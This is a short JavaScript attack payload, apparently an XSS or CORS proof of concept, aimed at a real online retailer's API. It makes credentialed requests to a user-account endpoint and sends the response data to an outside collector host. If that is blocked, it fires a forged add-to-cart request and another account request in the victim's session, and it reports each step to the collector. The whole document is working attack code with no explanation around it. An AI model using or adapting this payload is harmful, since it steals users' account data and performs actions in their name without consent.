alert('new_4');

var ATTACKER = 'https://dm3pjhjkpudpos6lmt41kc90xr3iref3.oastify.com';

fetch('https://api.ozon.ru/composer-api.bx/_action/getUserV2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
    credentials: 'include'
})
.then(function(r) {
    navigator.sendBeacon(ATTACKER + '?cors=ok&status=' + r.status);
    return r.text();
})
.then(function(text) {
    navigator.sendBeacon(ATTACKER + '/data', text);
})
.catch(function(err) {
    navigator.sendBeacon(ATTACKER + '?cors=blocked&err=' + encodeURIComponent(err.toString()));

    fetch('https://api.ozon.ru/composer-api.bx/_action/v2/addToCart', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ items: [{ id: 153560750, quantity: 1 }] }),
        credentials: 'include',
        mode: 'no-cors'
    }).then(function() {
        navigator.sendBeacon(ATTACKER + '?cart=fired');
    });

    fetch('https://api.ozon.ru/composer-api.bx/_action/getUserV2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({}),
        credentials: 'include',
        mode: 'no-cors'
    }).then(function() {
        navigator.sendBeacon(ATTACKER + '?userreq=fired');
    });
});
